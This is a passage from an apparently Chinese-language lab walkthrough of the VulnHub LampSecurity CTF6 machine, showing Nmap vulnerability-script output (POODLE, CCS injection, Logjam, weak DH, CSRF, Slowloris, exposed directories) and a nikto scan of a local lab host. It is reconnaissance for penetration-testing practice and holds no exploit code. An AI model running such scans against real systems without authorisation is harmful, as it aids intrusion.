Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|       http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">|_      http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">111/tcp  open  rpcbind</span><br><span class="hljs-string">143/tcp  open  imap</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|       http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">|_      http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="hljs-string">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="hljs-string">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="hljs-string">|       which could completely compromise the confidentiality and integrity</span><br><span class="hljs-string">|       of any data exchanged over the resulting session.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       ANONYMOUS DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 512</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 512</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="hljs-string">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="hljs-string">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="hljs-string">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="hljs-string">|       to downgrade the security of a TLS session to 512-bit export-grade</span><br><span class="hljs-string">|       cryptography, which is significantly weaker, allowing the attacker</span><br><span class="hljs-string">|       to more easily break the encryption and monitor or tamper with</span><br><span class="hljs-string">|       the encrypted stream.</span><br><span class="hljs-string">|     Disclosure date: 2015-5-19</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       EXPORT-GRADE DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 512</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 512</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://weakdh.org</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/74733</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">443/tcp  open  https</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| ssl-ccs-injection: <br>|   VULNERABLE:<br>|   SSL/TLS MITM vulnerability (CCS Injection)<br>|     State: VULNERABLE<br>|     Risk <span class="hljs-built_in">factor</span>: High<br>|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h<br>|       does not properly restrict processing of ChangeCipherSpec messages,<br>|       <span class="hljs-built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero<br>|       length master key <span class="hljs-keyword">in</span> certain OpenSSL-to-OpenSSL communications, and<br>|       consequently hijack sessions or obtain sensitive information, via<br>|       a crafted TLS handshake, aka the <span class="hljs-string">&quot;CCS Injection&quot;</span> vulnerability.<br>|           <br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224<br>|       http://www.cvedetails.com/cve/2014-0224<br>|_      http://www.openssl.org/news/secadv_20140605.txt<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: https://192.168.56.140:443/mail/</span><br><span class="hljs-string">|     Form id: rcmlogintz</span><br><span class="hljs-string">|     Form action: ./</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: https://192.168.56.140:443/?action=login</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|     Form action: ?action=login</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: https://192.168.56.140:443/mail/?_task=mail</span><br><span class="hljs-string">|     Form id: rcmlogintz</span><br><span class="hljs-string">|_    Form action: ./</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|       secure flag not <span class="hljs-built_in">set</span> and HTTPS <span class="hljs-keyword">in</span> use<br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-trace: TRACE is enabled<br>|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)<br>| http-enum: <br>|   /mail/: Mail folder<br>|   /logs/: Logs (401 Authorization Required)<br>|   /phpmyadmin/: phpMyAdmin<br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /docs/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /files/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /icons/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /inc/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /lib/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|   /manual/: Potentially interesting folder<br>|   /sql/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>|_  /templates/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.3 (centos)&#x27;</span><br>993/tcp  open  imaps<br>|_sslv2-drown: ERROR: Script execution failed (use -d to debug)<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://www.securityfocus.com/bid/70574<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use anonymous<br>|       Diffie-Hellman key exchange only provide protection against passive<br>|       eavesdropping, and are vulnerable to active man-in-the-middle attacks<br>|       <span class="hljs-built_in">which</span> could completely compromise the confidentiality and integrity<br>|       of any data exchanged over the resulting session.<br>|     Check results:<br>|       ANONYMOUS DH GROUP 1<br>|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 512<br>|             Generator Length: 8<br>|             Public Key Length: 512<br>|     References:<br>|       https://www.ietf.org/rfc/rfc2246.txt<br>|   <br>|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2015-4000  BID:74733<br>|       The Transport Layer Security (TLS) protocol contains a flaw that is<br>|       triggered when handling Diffie-Hellman key exchanges defined with<br>|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br>|       to downgrade the security of a TLS session to 512-bit export-grade<br>|       cryptography, <span class="hljs-built_in">which</span> is significantly weaker, allowing the attacker<br>|       to more easily <span class="hljs-built_in">break</span> the encryption and monitor or tamper with<br>|       the encrypted stream.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2015-5-19<br>|     Check results:<br>|       EXPORT-GRADE DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 512<br>|             Generator Length: 8<br>|             Public Key Length: 512<br>|     References:<br>|       https://weakdh.org<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000<br>|       https://www.securityfocus.com/bid/74733<br>|   <br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-ccs-injection: <br>|   VULNERABLE:<br>|   SSL/TLS MITM vulnerability (CCS Injection)<br>|     State: VULNERABLE<br>|     Risk <span class="hljs-built_in">factor</span>: High<br>|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h<br>|       does not properly restrict processing of ChangeCipherSpec messages,<br>|       <span class="hljs-built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero<br>|       length master key <span class="hljs-keyword">in</span> certain OpenSSL-to-OpenSSL communications, and<br>|       consequently hijack sessions or obtain sensitive information, via<br>|       a crafted TLS handshake, aka the <span class="hljs-string">&quot;CCS Injection&quot;</span> vulnerability.<br>|           <br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224<br>|       http://www.cvedetails.com/cve/2014-0224<br>|_      http://www.openssl.org/news/secadv_20140605.txt<br>995/tcp  open  pop3s<br>|_sslv2-drown: ERROR: Script execution failed (use -d to debug)<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use anonymous<br>|       Diffie-Hellman key exchange only provide protection against passive<br>|       eavesdropping, and are vulnerable to active man-in-the-middle attacks<br>|       <span class="hljs-built_in">which</span> could completely compromise the confidentiality and integrity<br>|       of any data exchanged over the resulting session.<br>|     Check results:<br>|       ANONYMOUS DH GROUP 1<br>|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 512<br>|             Generator Length: 8<br>|             Public Key Length: 512<br>|     References:<br>|       https://www.ietf.org/rfc/rfc2246.txt<br>|   <br>|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2015-4000  BID:74733<br>|       The Transport Layer Security (TLS) protocol contains a flaw that is<br>|       triggered when handling Diffie-Hellman key exchanges defined with<br>|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br>|       to downgrade the security of a TLS session to 512-bit export-grade<br>|       cryptography, <span class="hljs-built_in">which</span> is significantly weaker, allowing the attacker<br>|       to more easily <span class="hljs-built_in">break</span> the encryption and monitor or tamper with<br>|       the encrypted stream.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2015-5-19<br>|     Check results:<br>|       EXPORT-GRADE DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 512<br>|             Generator Length: 8<br>|             Public Key Length: 512<br>|     References:<br>|       https://weakdh.org<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000<br>|       https://www.securityfocus.com/bid/74733<br>|   <br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://www.securityfocus.com/bid/70574<br>| ssl-ccs-injection: <br>|   VULNERABLE:<br>|   SSL/TLS MITM vulnerability (CCS Injection)<br>|     State: VULNERABLE<br>|     Risk <span class="hljs-built_in">factor</span>: High<br>|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h<br>|       does not properly restrict processing of ChangeCipherSpec messages,<br>|       <span class="hljs-built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero<br>|       length master key <span class="hljs-keyword">in</span> certain OpenSSL-to-OpenSSL communications, and<br>|       consequently hijack sessions or obtain sensitive information, via<br>|       a crafted TLS handshake, aka the <span class="hljs-string">&quot;CCS Injection&quot;</span> vulnerability.<br>|           <br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224<br>|       http://www.cvedetails.com/cve/2014-0224<br>|_      http://www.openssl.org/news/secadv_20140605.txt<br>3306/tcp open  mysql<br>MAC Address: 00:0C:29:5C:75:70 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 167.11 seconds<br></code></pre></td></tr></table></figure>
<p>虽然很长一串，但是很多关于SSL漏洞的重复信息，且多是用于中间人攻击的，我们暂时用不上。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><p>然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ sudo nikto -h 192.168.56.140          <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.140<br>+ Target Hostname:    192.168.56.140<br>+ Target Port:        80<br>+ Start Time:         2023-04-28 11:16:09 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.2.3 (CentOS)<br>+ /: Retrieved x-powered-by header: PHP/5.2.6.<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /: HTTP TRACE method is active <span class="hljs-built_in">which</span> suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing<br>+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /files/: Directory indexing found.<br>+ /files/: This might be interesting.<br>+ /lib/: Directory indexing found.<br>+ /lib/: This might be interesting.<br>+ /mail/: Cookie roundcube_sessid created without the httponly flag. See: https://deveozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ /mail/: This might be interesting.<br>+ /phpmyadmin/changelog.php: phpMyAdmin is <span class="hljs-keyword">for</span> managing MySQL databases, and should beted or limited to authorized hosts.<br>+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with file /php/ChangeLog, inode: 97164, size: 35791, mtime: Thu Oct 20 05:47:44 2095. See: http://cv.org/cgi-bin/cvename.cgi?name=CVE-2003-1418<br>+ /phpmyadmin/ChangeLog: phpMyAdmin is <span class="hljs-keyword">for</span> managing MySQL databases, and should be proor limited to authorized hosts.<br>+ /sql/: Directory indexing found.<br>+ /manual/: Web server manual found.<br>+ /icons/: Directory indexing found.<br>+ /manual/images/: Directory indexing found.<br>+ /docs/: Directory indexing found.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restraccess-to-iconsreadme/<br>+ /phpmyadmin/: phpMyAdmin directory found.<br>+ /phpmyadmin/Documentation.html: phpMyAdmin is <span class="hljs-keyword">for</span> managing MySQL databases, and shourotected or limited to authorized hosts.<br>+ /phpmyadmin/README: phpMyAdmin is <span class="hljs-keyword">for</span> managing MySQL databases, and should be proteclimited to authorized hosts. See: https://typo3.org/<br>+ /<span class="hljs-comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br>+ 9060 requests: 0 error(s) and 32 item(s) reported on remote host<br>+ End Time:           2023-04-28 11:16:34 (GMT8) (25 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

